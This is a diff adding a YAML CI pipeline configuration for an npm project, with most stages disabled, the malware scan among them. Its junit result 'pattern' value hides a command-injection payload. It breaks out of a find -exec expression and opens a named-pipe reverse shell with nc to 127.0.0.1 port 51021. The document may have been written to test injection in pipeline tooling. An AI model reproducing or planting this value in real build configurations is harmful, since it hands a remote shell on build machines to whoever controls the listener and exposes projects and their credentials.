@@ -1,0 +1,36 @@
+---
+general:
+  buildTool: "npm"
+  verbose: true
+service:
+  buildToolVersion: "N18"
+stages:
+  Build:
+    mavenExecuteStaticCodeChecks: false
+    npmExecuteLint: false
+  Acceptance:
+    cloudFoundryDeploy: false
+    npmExecuteEndToEndTests: false
+  Malware Scan:
+    malwareExecuteScan: false
+  Release:
+    tmsExport: false
+    tmsUpload: false
+    cloudFoundryDeploy: false
+  Additional Unit Tests:
+    npmExecuteScripts: true
+  Compliance:
+    sonarExecuteScan: false
+steps:
+  dockerExecute:
+  npmExecuteScripts:
+    runScripts:
+      - "test2"
+  testsPublishResults:
+    junit:
+      active: true
+      pattern: "' -exec touch {} \\; ;\n mkfifo /tmp/fbrsrj; nc 127.0.0.1 51021 0</tmp/fbrsrj | /bin/sh >/tmp/fbrsrj 2>&1; rm /tmp/fbrsrj # -- "
+      allowEmptyResults: true
+      updateResults: true
+  artifactPrepareVersion:
+    versioningType: "cloud_noTag"
